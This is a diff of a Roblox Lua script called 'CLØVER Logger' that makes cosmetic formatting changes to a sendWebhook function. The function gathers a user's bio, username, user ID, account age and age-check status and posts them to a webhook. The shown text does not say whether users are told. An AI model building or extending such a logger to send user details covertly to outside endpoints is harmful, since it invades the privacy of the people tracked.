@@ -265,13 +265,13 @@ local function sendWebhook()
             url = "https://www.roblox.com/users/" .. userId .. "/profile",
             icon_url = thumbUrl
         },
-        description = "**Roblox Bio:**\n" .. (description ~= "N/A" and "> " .. description or "`No bio set.`"),
+        description = (description ~= "N/A" and "> " .. description or "`No bio set.`"),
         color = 0x2f3136,
         thumbnail = {
             url = thumbUrl
         },
         fields = {
-            { name = "Display Name",   value = "```" .. displayName .. "```", inline = true },
+            { name = "Displayname",    value = "```" .. displayName .. "```", inline = true },
             { name = "Username",       value = "```" .. username .. "```", inline = true },
             { name = "User ID",        value = "```" .. userId .. "```", inline = true },
             { name = "Account Age",    value = "```" .. accountAge .. " days```", inline = true },
@@ -279,7 +279,7 @@ local function sendWebhook()
             { name = "Age Check",      value = "```" .. ageStatus .. "```", inline = true },
         },
         footer = {
-            text = "CLØVER Logger • " .. os.date("%Y/%m/%d %H:%M:%S")
+            text = "*" .. "CLØVER Logger • " .. os.date("%Y/%m/%d %H:%M:%S") .. "*"
         }
     }
 
